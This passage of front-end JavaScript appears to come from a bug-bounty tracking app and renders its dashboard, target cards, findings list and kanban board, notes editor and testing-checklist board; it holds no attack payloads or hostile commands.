        <button class="copy-btn" style="position:absolute; top:-4px; right:0; padding:2px 6px; font-size:11px;" onclick="copyFindingPayload(${f.id})">📋 Copy</button>
        <div class="payload-snippet" style="white-space:pre-wrap;font-family:var(--mono);background:var(--bg3);padding:10px 12px;border-radius:var(--r-sm);font-size:12px;color:var(--accent);">${esc(f.payload)}</div>
      </div>` : ''}
    ${f.remediation ? `
      <div class="fd-section" style="margin-bottom:16px;">
        <div class="fd-section-label" style="font-size:11px;color:var(--text3);text-transform:uppercase;font-weight:700;margin-bottom:4px;">Remediation</div>
        <div class="fd-desc" style="white-space:pre-wrap;color:var(--text2);font-size:13px;">${esc(f.remediation)}</div>
      </div>` : ''}
    ${screenshots.length ? `
      <div class="fd-section" style="margin-bottom:16px;">
        <div class="fd-section-label" style="font-size:11px;color:var(--text3);text-transform:uppercase;font-weight:700;margin-bottom:4px;">Evidence (${screenshots.length})</div>
        <div class="fd-screenshots" style="display:flex;gap:8px;flex-wrap:wrap;margin-top:6px;">${screenshots.map((src,i) => `<img src="${src}" class="fd-screenshot-thumb" style="width:80px;height:60px;object-fit:cover;border:1px solid var(--border);border-radius:4px;cursor:pointer;" onclick="viewScreenshotSrc('${i}','detail')" title="Click to enlarge">`).join('')}</div>
      </div>` : ''}
    <div style="display:flex;gap:8px;margin-top:24px;">
      <button class="btn btn-primary btn-sm" onclick="closeQuickviewDrawer();openFindingModal(${f.id})" style="flex:1;">✏️ Edit</button>
      <button class="btn btn-sm" onclick="copyFindingAsMarkdown(${f.id})" style="flex:1;">📋 Markdown</button>
    </div>
  `;
  
  drawer.classList.add('open');
  overlay.classList.add('open');
  window._detailScreenshots = screenshots;
};

window.closeQuickviewDrawer = function() {
  const drawer = document.getElementById('quickview-drawer');
  const overlay = document.getElementById('quickview-overlay');
  if (drawer) drawer.classList.remove('open');
  if (overlay) overlay.classList.remove('open');
};

function renderDashboard() {
  const tAct = S.targets.filter(t => t.status === 'active').length;
  const critHigh = S.findings.filter(f => ['critical', 'high'].includes(f.severity)).length;
  const totalBounty = S.findings.reduce((acc, f) => acc + bountyAmount(f), 0);

  document.getElementById('stat-targets').textContent = tAct;
  document.getElementById('stat-findings').textContent = S.findings.length;
  document.getElementById('stat-critical').textContent = critHigh;
  document.getElementById('stat-notes').textContent = S.notes.length;
  document.getElementById('stat-bounties').textContent = '$' + totalBounty.toLocaleString();

  // Deadline alerts
  if (typeof renderDeadlineAlerts === 'function') renderDeadlineAlerts();

  // Render recent targets with subdomain progress bars
  document.getElementById('dash-targets').innerHTML = S.targets.slice(0, 3).map(t => {
    const assets = S.assets.filter(a => a.targetId == t.id);
    const tested = assets.filter(a => a.status === 'tested').length;
    const pct = assets.length > 0 ? Math.round((tested / assets.length) * 100) : 0;
    
    return `
    <div style="padding:8px 0;border-bottom:1px solid var(--border)">
      <div style="display:flex;align-items:center;gap:10px;">
        <div style="width:8px;height:8px;border-radius:50%;background:${t.status === 'active' ? 'var(--green)' : t.status === 'pending' ? 'var(--orange)' : t.status === 'paused' ? 'var(--red)' : 'var(--text3)'}"></div>
        <div style="flex:1;font-size:13px;font-weight:600;color:#fff;">${esc(t.name)}</div>
        <div style="font-family:var(--mono);font-size:11px;color:var(--text3)">${esc(t.platform)}</div>
      </div>
      <div class="mini-progress-container">
        <div class="mini-progress-track">
          <div class="mini-progress-fill" style="width:${pct}%"></div>
        </div>
        <span class="mini-progress-text">${tested}/${assets.length} tested (${pct}%)</span>
      </div>
    </div>`;
  }).join('') || '<div class="empty-state" style="padding:16px 0;"><div class="es-sub">Add a target</div></div>';

  // Render recent findings with quickview integration
  document.getElementById('dash-findings').innerHTML = S.findings.slice(0, 3).map(f => `
    <div style="display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid var(--border);cursor:pointer;" onclick="openFindingQuickView(${f.id})" title="Click for quick preview">
      ${sevLabels[f.severity] || ''}
      <div style="flex:1;font-size:12.5px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#fff;">${esc(f.title)}</div>
      <span style="font-size:10px;color:var(--text3)">👁️ Quick View</span>
    </div>`).join('') || '<div class="empty-state" style="padding:16px 0;"><div class="es-sub">No findings</div></div>';

  let c = 0, h = 0, m = 0, l = 0, i = 0;
  S.findings.forEach(f => {
    if (f.severity === 'critical') c++;
    if (f.severity === 'high') h++;
    if (f.severity === 'medium') m++;
    if (f.severity === 'low') l++;
    if (f.severity === 'info') i++;
  });

  const totalFindings = S.findings.length;
  document.getElementById('donut-total-val').textContent = totalFindings;

  const donutSvg = document.getElementById('dash-donut-svg');
  const donutList = document.getElementById('dash-donut-list');

  if (donutSvg && donutList) {
    const data = [
      { key: 'critical', label: 'Critical', val: c, color: 'var(--red)', class: 'c-crit' },
      { key: 'high', label: 'High', val: h, color: 'var(--orange)', class: 'c-high' },
      { key: 'medium', label: 'Medium', val: m, color: 'var(--yellow)', class: 'c-med' },
      { key: 'low', label: 'Low', val: l, color: 'var(--accent)', class: 'c-low' },
      { key: 'info', label: 'Info', val: i, color: 'var(--purple)', class: 'c-info' }
    ];

    let svgHtml = '';
    let listHtml = '';
    const circumference = 314.159; // 2 * pi * r (r=50)

    if (totalFindings === 0) {
      svgHtml = `<circle cx="70" cy="70" r="50" fill="none" stroke="var(--border)" stroke-width="12" />`;
      listHtml = data.map(item => `
        <div class="sev-bar-row-new">
          <span style="color:var(--text3);">${item.label}</span>
          <span style="color:var(--text3);">0</span>
        </div>
      `).join('');
    } else {
      let currentOffset = 0;
      data.forEach(item => {
        const pct = item.val / totalFindings;
        const dash = pct * circumference;
        const offset = -currentOffset;
        currentOffset += dash;

        if (item.val > 0) {
          svgHtml += `
            <circle cx="70" cy="70" r="50" 
              class="donut-segment" 
              stroke="${item.color}" 
              stroke-dasharray="${dash} ${circumference}" 
              stroke-dashoffset="${offset}" 
              transform="rotate(-90 70 70)"
              title="${item.label}: ${item.val} (${Math.round(pct*100)}%)" />
          `;
        }

        listHtml += `
          <div class="sev-bar-row-new ${item.class}" onclick="goPage('findings'); filterFindingsSev('${item.key}')" title="Filter by ${item.label}">
            <span style="color:${item.color}; font-weight:600">${item.label}</span>
            <span style="color:#fff;">${item.val} (${Math.round(pct*100)}%)</span>
          </div>
        `;
      });
    }
    donutSvg.innerHTML = svgHtml;
    donutList.innerHTML = listHtml;
  }

  // Draw weekly findings and activity trend
  const trendSvg = document.getElementById('activity-trend-svg');
  if (trendSvg) {
    const now = Date.now();
    const oneDay = 24 * 60 * 60 * 1000;
    const counts = [0, 0, 0, 0, 0, 0, 0];
    const labels = [];
    
    for (let dayOffset = 6; dayOffset >= 0; dayOffset--) {
      const d = new Date(now - dayOffset * oneDay);
      const label = d.toLocaleDateString(undefined, { weekday: 'short' });
      labels.push(label);
    }
    
    const activeTimes = S.activity || [];
    activeTimes.forEach(act => {
      const diff = now - act.time;
      if (diff >= 0 && diff < 7 * oneDay) {
        const dayIdx = 6 - Math.floor(diff / oneDay);
        if (dayIdx >= 0 && dayIdx <= 6) counts[dayIdx]++;
      }
    });

    const activeFindings = S.findings || [];
    activeFindings.forEach(f => {
      if (f.created_at || f.time) {
        const fTime = f.created_at ? new Date(f.created_at).getTime() : f.time;
        const diff = now - fTime;
        if (diff >= 0 && diff < 7 * oneDay) {
          const dayIdx = 6 - Math.floor(diff / oneDay);
          if (dayIdx >= 0 && dayIdx <= 6) counts[dayIdx]++;
        }
      }
    });

    const maxVal = Math.max(...counts, 4);
    const width = trendSvg.clientWidth || 300;
    const height = 80;
    const paddingLeft = 18;
    const paddingRight = 18;
    const paddingTop = 12;
    const paddingBottom = 20;

    const chartW = width - paddingLeft - paddingRight;
    const chartH = height - paddingTop - paddingBottom;

    let points = [];
    for (let j = 0; j < 7; j++) {
      const x = paddingLeft + (j / 6) * chartW;
      const y = paddingTop + chartH - (counts[j] / maxVal) * chartH;
      points.push({ x, y });
    }

    const pathD = `M ${points.map(p => `${p.x} ${p.y}`).join(' L ')}`;
    const areaD = `${pathD} L ${points[6].x} ${paddingTop + chartH} L ${points[0].x} ${paddingTop + chartH} Z`;

    let guidesHtml = '';
    for (let k = 0; k <= 2; k++) {
      const yVal = paddingTop + (k / 2) * chartH;
      guidesHtml += `<line x1="${paddingLeft}" y1="${yVal}" x2="${width - paddingRight}" y2="${yVal}" class="trend-grid" />`;
    }

    let labelsHtml = '';
    points.forEach((p, j) => {
      labelsHtml += `
        <text x="${p.x}" y="${height - 4}" fill="var(--text3)" font-size="8" font-family="var(--mono)" text-anchor="middle">${labels[j]}</text>
        <circle cx="${p.x}" cy="${p.y}" r="3" fill="var(--accent)" stroke="#fff" stroke-width="0.75" title="${counts[j]} logs" />
      `;
    });

    trendSvg.innerHTML = `
      ${guidesHtml}
      <path d="${areaD}" class="trend-area" />
      <path d="${pathD}" class="trend-path" />
      ${labelsHtml}
    `;
  }

  // Active scan banner periodic check trigger
  if (!window.dashboardMonitorInterval) {
    window.dashboardMonitorInterval = setInterval(() => {
      if (document.getElementById('page-dashboard')?.classList.contains('active')) {
        window.updateDashboardScanMonitor();
      }
    }, 1000);
  }
  window.updateDashboardScanMonitor();

  // SECURITY FIX: build activity items safely with textContent instead of raw innerHTML
  const feedEl = document.getElementById('activity-feed');
  if (feedEl) {
    feedEl.innerHTML = '';
    const acts = S.activity.slice(0, 10);
    if (!acts.length) {
      feedEl.innerHTML = '<div class="empty-state"><div class="es-sub">No recent activity</div></div>';
    } else {
      acts.forEach(a => {
        const item = document.createElement('div');
        item.className = 'activity-item';
        const iconDiv = document.createElement('div');
        iconDiv.className = 'act-icon';
        iconDiv.style.cssText = 'background:var(--bg4);color:var(--text2);';
        iconDiv.textContent = a.icon || '⚡';
        const bodyDiv = document.createElement('div');
        bodyDiv.className = 'act-body';
        const textDiv = document.createElement('div');
        textDiv.className = 'act-text';
        let safeHtml = (a.html || '').replace(/(<(?!\/?(strong|em|b|i|span|a)\b)[^>]+>)/gi, '');
        safeHtml = safeHtml.replace(/<(\/?[a-zA-Z0-9]+)\s+[^>]+>/g, '<$1>');
        textDiv.innerHTML = safeHtml;
        const timeDiv = document.createElement('div');
        timeDiv.className = 'act-time';
        timeDiv.textContent = timeAgo(a.time);
        bodyDiv.appendChild(textDiv);
        bodyDiv.appendChild(timeDiv);
        item.appendChild(iconDiv);
        item.appendChild(bodyDiv);
        feedEl.appendChild(item);
      });
    }
  }
}

function renderTargets() {
  let list = S.targets;
  if (targetSearch) {
    const q = targetSearch.toLowerCase();
    list = list.filter(t => t.name.toLowerCase().includes(q) || (t.scope && t.scope.toLowerCase().includes(q)));
  }
  if (targetStatus) list = list.filter(t => t.status === targetStatus);
  if (targetPlatform) list = list.filter(t => t.platform === targetPlatform);
  const el = document.getElementById('targets-list');
  if (!list.length) {
    el.innerHTML = '<div class="empty-state"><div class="es-icon">🎯</div><div class="es-title">No targets found</div></div>';
    return;
  }
  el.innerHTML = list.map(t => {
    const tags = typeof parseTags !== 'undefined' ? parseTags(t.tags) : (t.tags ? t.tags.split(',').map(s=>s.trim()).filter(Boolean) : []);
    const sessionFmt = t.sessionTime > 0 ? (typeof formatSeconds !== 'undefined' ? formatSeconds(t.sessionTime) : '') : null;
    const now = Date.now();
    const daysLeft = t.deadline ? Math.ceil((new Date(t.deadline).getTime() - now) / 86400000) : null;
    const isActive = activeSession && activeSession.targetId == t.id;
    return `
    <div class="target-card status-${t.status}">
      <div class="target-status-icon" style="background:var(--green-dim);color:var(--green)">🎯</div>
      <div class="target-body">
        <div class="target-name">${esc(t.name)} ${t.url ? `<a href="${esc(t.url)}" target="_blank" style="color:var(--accent);margin-left:6px">🔗</a>` : ''}</div>
        <div class="target-scope">${esc(t.scope)}</div>
        <div class="target-tags">
          <span class="chip chip-blue">${esc(t.platform)}</span>
          <span class="chip chip-green">${esc((t.status || '').toUpperCase())}</span>
          ${t.outScope ? '<span class="chip chip-red">Out-of-Scope defined</span>' : ''}
          ${tags.map(tag => `<span class="tag-chip">${esc(tag)}</span>`).join('')}
          ${sessionFmt ? `<span class="chip" title="Total session time">⏱ ${sessionFmt}</span>` : ''}
          ${daysLeft !== null ? `<span class="chip ${daysLeft <= 3 ? 'chip-red' : daysLeft <= 7 ? 'chip-yellow' : ''}" title="Disclosure deadline">📅 ${daysLeft <= 0 ? 'OVERDUE' : daysLeft + 'd'}</span>` : ''}
        </div>
        ${t.notes ? `<div style="font-size:11.5px;color:var(--text3);margin-top:8px">${esc(t.notes)}</div>` : ''}
      </div>
      <div class="target-right">
        ${t.bounty ? `<div class="target-bounty">Max: $${esc(t.bounty).replace(/^\$/, '')}</div>` : '<div></div>'}
        <div class="target-actions">
          ${isActive
            ? `<button class="btn btn-sm" style="color:var(--red);border-color:var(--red)" onclick="stopTargetSession(true)">⏹ Stop</button>`
            : `<button class="btn btn-sm" onclick="startTargetSession(${t.id})">▶ Hunt</button>`
          }
          <button class="btn btn-sm" onclick="goPage('recon');selectReconTarget(${t.id})">Recon</button>
          <button class="btn btn-sm" onclick="editTarget(${t.id})">Edit</button>
          <button class="btn btn-sm btn-danger" onclick="removeTarget(${t.id})">Delete</button>
        </div>
      </div>
    </div>`;
  }).join('');
}

function filterTargets(v) { targetSearch = v; renderTargets(); }
function filterTargetStatus(v) { targetStatus = v; renderTargets(); }
function filterTargetPlatform(v) { targetPlatform = v; renderTargets(); }

async function removeTarget(id) {
  const confirmed = await new Promise(res => showConfirm('Remove this target and all its recon assets? This cannot be undone.', () => res(true), () => res(false)));
  if (!confirmed) return;
  S.targets = S.targets.filter(t => t.id !== id);
  S.assets = S.assets.filter(a => a.targetId != id);
  await apiDelete('/api/targets/' + id);
  save(); updateBadges(); renderPage(currentPage); toast('Target removed');
}

function setFindingsView(mode) {
  findingsViewMode = mode;
  document.getElementById('fv-list')?.classList.toggle('active', mode === 'list');
  document.getElementById('fv-kanban')?.classList.toggle('active', mode === 'kanban');
  document.getElementById('findings-list-wrap').style.display = mode === 'list' ? 'block' : 'none';
  document.getElementById('findings-kanban').style.display = mode === 'kanban' ? 'block' : 'none';
  renderFindings();
}

function renderKanbanFindings(list) {
  const cols = ['Found', 'Reported', 'Triaged', 'Accepted', 'Bounty Paid', 'Duplicate', 'N/A'];
  const board = document.getElementById('findings-kanban');
  if (!board) return;
  if (!list.length) {
    board.innerHTML = '<div class="empty-state"><div class="es-sub">No findings</div></div>';
    return;
  }
  board.innerHTML = '<div class="kanban-board">' + cols.map(status => {
    const items = list.filter(f => (f.status || 'Found') === status);
    return `<div class="kanban-col" data-status="${esc(status)}"
      ondragover="event.preventDefault();this.classList.add('drag-over')"
      ondragleave="this.classList.remove('drag-over')"
      ondrop="kanbanDrop(event,${JSON.stringify(status)})"
    >
      <div class="kanban-col-head">${esc(status)} <span style="opacity:0.5">(${items.length})</span></div>` +
      items.map(f => `<div class="kanban-card fcard-${(f.severity || '').toLowerCase()}"
          draggable="true"
          ondragstart="kanbanDragStart(event,${f.id})"
          onclick="editFinding(${f.id})"
          title="Drag to change status">
        <div style="font-weight:600;margin-bottom:4px;font-size:12.5px">${esc(f.title)}</div>
        <div style="display:flex;align-items:center;gap:6px;margin-top:4px">
          ${sevLabels[f.severity] || ''}
          ${f.host ? `<span style="font-size:10px;color:var(--text3);font-family:var(--mono)">${esc(f.host.substring(0,30))}</span>` : ''}
        </div>
      </div>`).join('') + '</div>';
  }).join('') + '</div>';
}

let _kanbanDragId = null;
function kanbanDragStart(e, findingId) {
  _kanbanDragId = findingId;
  e.dataTransfer.effectAllowed = 'move';
}
async function kanbanDrop(e, newStatus) {
  e.preventDefault();
  document.querySelectorAll('.kanban-col').forEach(c => c.classList.remove('drag-over'));
  if (_kanbanDragId == null) return;
  const f = S.findings.find(x => x.id == _kanbanDragId);
  if (!f || f.status === newStatus) return;
  f.status = newStatus;
  await apiPost('/api/findings', f);
  save();
  renderFindings();
  toast(`Status → ${newStatus}`, 'success');
  _kanbanDragId = null;
}

function exportFindingsCsv() {
  const rows = [['title', 'severity', 'type', 'host', 'status', 'bounty', 'cvss']];
  S.findings.forEach(f => rows.push([
    f.title, f.severity, f.type, f.host, f.status, f.bountyEarned || '', f.cvss || ''
  ]));
  const csv = rows.map(r => r.map(c => '"' + String(c || '').replace(/"/g, '""') + '"').join(',')).join('\n');
  const a = document.createElement('a');
  a.href = 'data:text/csv;charset=utf-8,' + encodeURIComponent(csv);
  a.download = 'findings_' + new Date().toISOString().split('T')[0] + '.csv';
  a.click();
  toast('CSV exported', 'success');
}

function renderFindings() {
  let list = S.findings;
  if (findingSearch) {
    const q = findingSearch.toLowerCase();
    list = list.filter(f => f.title.toLowerCase().includes(q) || (f.host || '').toLowerCase().includes(q) || (f.type || '').toLowerCase().includes(q));
  }
  if (findingSev) list = list.filter(f => f.severity === findingSev);
  if (findingStatus) list = list.filter(f => f.status === findingStatus);
  if (findingType) list = list.filter(f => f.type === findingType);
  if (findingsViewMode === 'kanban') {
    renderKanbanFindings(list);
    return;
  }
  const el = document.getElementById('findings-list');
  if (!list.length) {
    el.innerHTML = '<div class="empty-state"><div class="es-icon">🐛</div><div class="es-title">No findings match</div></div>';
    return;
  }
  el.innerHTML = list.map(f => {
    const earned = f.bountyEarned || f.bounty;
    const tname = targetNameById(f.targetId);
    const tags = typeof parseTags !== 'undefined' ? parseTags(f.tags) : (f.tags ? f.tags.split(',').map(s=>s.trim()).filter(Boolean) : []);
    let hasScreenshots = false;
    try { hasScreenshots = !!(f.screenshots && JSON.parse(f.screenshots).length > 0); } catch(e) {}
    return `
    <div class="finding-card fcard-${(f.severity || '').toLowerCase()}">
      <div class="finding-head">
        <div class="finding-title-wrap">
          <div class="finding-title" onclick="openFindingDetail(${f.id})" style="cursor:pointer;text-decoration:underline dotted">${esc(f.title)}</div>
          <div class="finding-host">${esc(f.host)} ${f.endpoint ? `<span style="color:var(--text3)">${esc(f.endpoint)}</span>` : ''}</div>
          ${tname ? `<div style="font-size:11px;color:var(--accent);margin-top:4px">🎯 ${esc(tname)}</div>` : ''}
        </div>
        <div style="display:flex;gap:6px">
          <button class="btn btn-sm" onclick="openFindingDetail(${f.id})">👁 View</button>
          <button class="btn btn-sm" onclick="editFinding(${f.id})">Edit</button>
          <button class="btn btn-sm btn-danger" onclick="removeFinding(${f.id})">Delete</button>
        </div>
      </div>
      <div class="finding-meta">
        ${sevLabels[f.severity] || ''}
        <span class="chip chip-gray">${esc(f.type)}</span>
        <span class="status-badge">${esc(f.status)}</span>
        ${f.cvss ? `<span class="chip chip-gray">CVSS: ${esc(f.cvss)}</span>` : ''}
        ${earned ? `<span class="chip chip-green">💰 $${esc(earned).replace(/^\$/, '')}</span>` : ''}
        ${hasScreenshots ? '<span class="chip chip-blue">📸 Evidence</span>' : ''}
        ${tags.map(t => `<span class="tag-chip">${esc(t)}</span>`).join('')}
      </div>
      ${f.desc ? `<div class="finding-desc" style="margin-top:10px;white-space:pre-wrap">${esc(f.desc.substring(0,200))}${f.desc.length>200?'…':''}</div>` : ''}
    </div>`;
  }).join('');
}

function filterFindings(v) { findingSearch = v; renderFindings(); }
function filterFindingsSev(v) { findingSev = v; renderFindings(); }
function filterFindingsStatus(v) { findingStatus = v; renderFindings(); }
function filterFindingsType(v) { findingType = v; renderFindings(); }

async function removeFinding(id) {
  const confirmed = await new Promise(res => showConfirm('Remove this finding permanently?', () => res(true), () => res(false)));
  if (!confirmed) return;
  S.findings = S.findings.filter(f => f.id !== id);
  await apiDelete('/api/findings/' + id);
  save(); updateBadges(); renderFindings(); toast('Finding removed');
}

function renderNotes() {
  const editor = document.querySelector('.note-editor');
  let list = S.notes;
  if (noteSearch) {
    const q = noteSearch.toLowerCase();
    list = list.filter(n => n.title.toLowerCase().includes(q) || (n.content || '').toLowerCase().includes(q));
  }
  if (noteCat) list = list.filter(n => n.category === noteCat);
  if (!list.length) {
    document.getElementById('notes-list').innerHTML = '<div class="empty-state"><div class="es-sub">No notes</div></div>';
    if (editor) editor.style.display = 'none';
    // Reset editor state so stale content isn't shown if filter is cleared
    currentNote = null;
    const titleInput = document.getElementById('edit-note-title');
    const bodyInput = document.getElementById('edit-note-body');
    if (titleInput) titleInput.value = '';
    if (bodyInput) bodyInput.value = '';
    return;
  }
  // Check if currentNote is still in the filtered list; if not, deselect it
  const currentInList = currentNote && list.find(n => n.id === currentNote);
  if (!currentInList) {
    currentNote = null;
    const titleInput = document.getElementById('edit-note-title');
    const bodyInput = document.getElementById('edit-note-body');
    if (titleInput) titleInput.value = '';
    if (bodyInput) bodyInput.value = '';
  }
  if (editor) editor.style.display = 'flex';
  document.getElementById('notes-list').innerHTML = list.map(n => {
    // Strip markdown formatting symbols for clean preview
    const cleanSnippet = (n.content || '')
      .replace(/[#*`>-]/g, '')
      .replace(/\s+/g, ' ')
      .trim();
    const targetLabel = n.target && n.target !== 'None' ? n.target : '';
    
    // Format note date
    let dateStr = '';
    if (n.created) {
      let d = new Date(n.created);
      if (isNaN(d.getTime())) d = new Date(parseInt(n.created) || Date.now());
      if (!isNaN(d.getTime())) {
        const isToday = d.toDateString() === new Date().toDateString();
        if (isToday) {
          dateStr = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        } else {
          dateStr = d.toLocaleDateString([], { month: 'short', day: 'numeric' });
        }
      }
    }

    return `
      <div class="note-item ${currentNote === n.id ? 'active' : ''}" onclick="selectNote(${n.id})">
        <div class="note-item-title">${esc(n.title)}</div>
        <div class="note-item-meta" style="display:flex; gap:6px; flex-wrap:wrap; margin-bottom:6px; font-family:var(--font); font-weight:500;">
          <span class="chip chip-purple" style="font-size:9px; padding:1px 5px; border-radius:3px; border-width:1px;">${esc(n.category)}</span>
          ${targetLabel ? `<span class="chip chip-blue" style="font-size:9px; padding:1px 5px; border-radius:3px; border-width:1px;">${esc(targetLabel)}</span>` : ''}
        </div>
        <div class="note-item-preview" style="display:flex; align-items:center; gap:6px;">
          ${dateStr ? `<span class="note-item-date" style="color:var(--text3); font-size:11px; font-family:var(--mono); flex-shrink:0;">${esc(dateStr)}</span>` : ''}
          ${dateStr ? `<span style="color:var(--border); font-size:10px; flex-shrink:0;">|</span>` : ''}
          <span style="color:var(--text2); overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${esc(cleanSnippet)}</span>
        </div>
      </div>
    `;
  }).join('');
  if (!currentNote && list.length) selectNote(list[0].id);
}

function selectNote(id) {
  currentNote = id;
  const n = S.notes.find(x => x.id === id);
  if (n) {
    document.getElementById('edit-note-title').value = n.title;
    document.getElementById('edit-note-body').value = n.content || '';
    // Reset preview to edit mode
    if (typeof setNoteViewMode === 'function') {
      setNoteViewMode('edit');
    } else {
      const preview = document.getElementById('note-preview-area');
      const textarea = document.getElementById('edit-note-body');
      if (preview) { preview.style.display = 'none'; }
      if (textarea) { textarea.style.display = 'block'; }
    }
    updateNoteStats();
    const createdEl = document.getElementById('note-created');
    if (createdEl) {
      let d = new Date(n.created);
      if (isNaN(d.getTime())) d = new Date(parseInt(n.created) || Date.now()); // fallback
      if (!isNaN(d.getTime())) {
        const dateStr = d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
        createdEl.innerHTML = '<span class="stat-icon">⏱</span>Created: ' + dateStr;
      } else {
        createdEl.innerHTML = '';
      }
    }
    document.getElementById('note-save-status').textContent = '';
  }
  renderNotes();
}

function updateNoteStats() {
  const body = document.getElementById('edit-note-body')?.value || '';
  const wc = document.getElementById('note-wc');
  const lc = document.getElementById('note-lc');
  const wordCount = body.trim() ? body.trim().split(/\s+/).length : 0;
  const lineCount = body.split('\n').length;
  if (wc) wc.innerHTML = '<span class="stat-icon">◈</span>' + wordCount + ' words';
  if (lc) lc.innerHTML = '<span class="stat-icon">≡</span>' + lineCount + ' lines';
}

async function saveCurrentNote() {
  if (!currentNote) return;
  const note = S.notes.find(n => n.id === currentNote);
  if (!note) return;
  note.title = document.getElementById('edit-note-title').value;
  note.content = document.getElementById('edit-note-body').value;
  await apiPost('/api/notes', note);
  save();
  const ss = document.getElementById('note-save-status');
  if (ss) {
    const d = new Date();
    ss.innerHTML = '● Saved at ' + d.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
  }
}

function autoSaveNote() {
  clearTimeout(autoSaveTimer);
  updateNoteStats();
  if (typeof updateLivePreview === 'function') {
    updateLivePreview();
  }
  autoSaveTimer = setTimeout(saveCurrentNote, 800);
}

function deleteCurrentNote() {
  if (!currentNote) return;
  removeNote(currentNote);
}

async function removeNote(id) {
  const confirmed = await new Promise(res => showConfirm('Delete this note permanently?', () => res(true), () => res(false)));
  if (!confirmed) return;
  S.notes = S.notes.filter(n => n.id !== id);
  await apiDelete('/api/notes/' + id);
  if (currentNote === id) {
    currentNote = null;
    document.getElementById('edit-note-title').value = '';
    document.getElementById('edit-note-body').value = '';
  }
  save(); updateBadges(); renderNotes(); toast('Note deleted');
}

function filterNotes(v) { noteSearch = v; renderNotes(); }
function filterNotesCat(v) { noteCat = v; renderNotes(); }

window.getActiveChecklistData = function() {
  const sel = document.getElementById('flow-target-sel');
  const tid = sel ? sel.value : 'workspace';
  if (tid && tid !== 'workspace') {
     const t = S.targets.find(x => x.id == tid);
     if (t) {
        if (!t.checklist) t.checklist = {};
        return { data: t.checklist, tid: t.id };
     }
  }
  return { data: S.checklist, tid: null };
};

window.saveActiveChecklistData = function(tid, data) {
  if (tid) {
     const t = S.targets.find(x => x.id == tid);
     if (t) {
        t.checklist = data;
        apiPost('/api/targets', t);
     }
  } else {
     S.checklist = data;
     apiPost('/api/checklist', S.checklist);
  }
  save();
};

window.changeFlowTarget = function() {
  renderChecklist();
};

function renderChecklist() {
  const sel = document.getElementById('flow-target-sel');
  if (sel) {
     const currentVal = sel.value;
     let opts = '<option value="workspace">🌐 Global Workspace Flow</option>';
     S.targets.forEach(t => {
         opts += `<option value="${t.id}">🎯 ${esc(t.name)}</option>`;
     });
     sel.innerHTML = opts;
     if (currentVal && (currentVal === 'workspace' || S.targets.find(x=>x.id==currentVal))) {
         sel.value = currentVal;
     } else {
         const active = S.targets.find(x => x.status === 'active');
         sel.value = active ? active.id : 'workspace';
     }
  }

  const { data: clData } = getActiveChecklistData();
  const sevColor = { critical: 'var(--red)', high: 'var(--orange)', medium: 'var(--yellow)', low: 'var(--accent)', info: 'var(--purple)' };
  
  let allCats = [];
  Object.entries(checklists).forEach(([key, items]) => {
      let title = key;
      if (key === 'recon') title = 'Reconnaissance';
      if (key === 'web') title = 'Web Application';
      if (key === 'auth') title = 'Authentication';
      if (key === 'api') title = 'API Testing';
      if (key === 'data') title = 'Data Exposure';
      if (key === 'infra') title = 'Infrastructure';
      allCats.push({ id: key, title: title, items: items });
  });
  
  try {
      let custom = JSON.parse(S.config.custom_checklists || '[]');
      custom.forEach(c => allCats.push(c));
  } catch(e) {}
  
  const container = document.getElementById('attack-flow-board');
  if (!container) return;
  
  let html = '';
  let total = 0;
  let done = 0;

  allCats.forEach(cat => {
      let catTotal = cat.items.length;
      let catDone = 0;

      let itemsHtml = cat.items.map((item, i) => {
          total++;
          const cid = 'cl-' + cat.id + '-' + i;
          let val = clData[cid] || {};
          let isChecked = typeof val === 'boolean' ? val : val.checked;
          if (isChecked) { done++; catDone++; }
          let hasNote = (typeof val === 'object' && val.notes && val.notes.trim() !== '');
          
          return `
            <div class="flow-node ${isChecked ? 'completed' : ''}" onclick="toggleCheck('${cid}')">
              <div class="fn-header">
                <div class="fn-title">${esc(item[0])}</div>
                <div class="fn-checkbox">${isChecked ? '✓' : ''}</div>
              </div>
              <div style="display:flex; justify-content:space-between; align-items:center;">
                 <div class="fn-severity" style="color:${sevColor[item[1]] || 'var(--text3)'}">${item[1].toUpperCase()}</div>
                 <button class="btn btn-sm" style="background:${hasNote?'var(--primary)':'transparent'};border:1px solid ${hasNote?'var(--primary)':'var(--border)'};padding:2px 8px;font-size:10px;" onclick="event.stopPropagation(); openChecklistNote('${cid}', '${esc(item[0]).replace(/'/g, "\\'")}')">${hasNote ? '📝 View Note' : '➕ Add Note'}</button>
              </div>
            </div>`;
      }).join('');

      let pct = catTotal ? Math.round((catDone / catTotal) * 100) : 0;
      let delBtn = cat.id.startsWith('cst_') ? `<button class="btn btn-sm btn-danger" style="padding:2px 6px;background:var(--bg2);border:1px solid var(--border);" onclick="deleteCustomChecklist('${cat.id}')" title="Delete Category">🗑</button>` : '';

      html += `
        <div class="flow-stage">
          <div class="flow-stage-header">
             <span>${esc(cat.title)}</span>
             <div style="display:flex; align-items:center; gap:8px;">
               <div class="flow-stage-pct">${pct}%</div>
               ${delBtn}
             </div>
          </div>
          <div class="flow-stage-body">
             ${itemsHtml}
          </div>
        </div>
      `;
  });
  
  html += `
    <div class="flow-stage" style="border: 1px dashed var(--border); background: transparent; align-items:center; justify-content:center; cursor:pointer;" onclick="openModal('modal-custom-checklist')">
      <div style="font-size: 40px; color: var(--border); margin-bottom: 16px;">+</div>
      <div style="color: var(--text3); font-weight: 600;">Add Custom Stage</div>
    </div>
  `;

  container.innerHTML = html;
  updateChecklistProgress();
}

window.toggleCheck = function(cid) {
  const { data: clData, tid } = getActiveChecklistData();
  let val = clData[cid] || {checked: false, notes: ''};
  if (typeof val === 'boolean') val = {checked: val, notes: ''};
  val.checked = !val.checked;
  clData[cid] = val;
  saveActiveChecklistData(tid, clData);
  renderChecklist();
};

window.openChecklistNote = function(cid, name) {
  document.getElementById('cl-note-item-name').textContent = name;
  document.getElementById('cl-note-cid').value = cid;
  const { data: clData } = getActiveChecklistData();
  let val = clData[cid] || {};
  document.getElementById('cl-note-text').value = val.notes || '';
  openModal('modal-checklist-note');
};

window.saveChecklistNote = function() {
  const cid = document.getElementById('cl-note-cid').value;
  const txt = document.getElementById('cl-note-text').value;
